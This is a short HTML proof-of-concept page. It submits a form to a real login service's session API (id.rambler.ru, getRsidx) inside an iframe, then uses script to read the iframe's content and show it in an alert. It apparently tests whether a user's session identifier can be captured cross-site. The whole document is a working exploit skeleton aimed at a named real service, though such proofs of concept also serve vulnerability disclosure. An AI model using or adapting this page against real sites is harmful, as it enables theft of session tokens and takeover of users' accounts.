<html>
    <head><title></title></head>
    <body>
        <script>
            function getIframeContent(frameId) {
                var frameObj = 
                    document.getElementById(frameId);

                var frameContent = frameObj.
                    contentWindow.document.body.innerHTML;
                    
                alert("frame content : " + frameContent);
            }
        </script>
        <iframe width=600 height=600 name="myname" id="myid"></iframe>
        <form target="myname" method="POST" action="https://id.rambler.ru/api/v3/session/getRsidx">
            <input type="submit">
        </form>
        <input type="button" onclick="getIframeContent('myid')">
    </body>
</html>
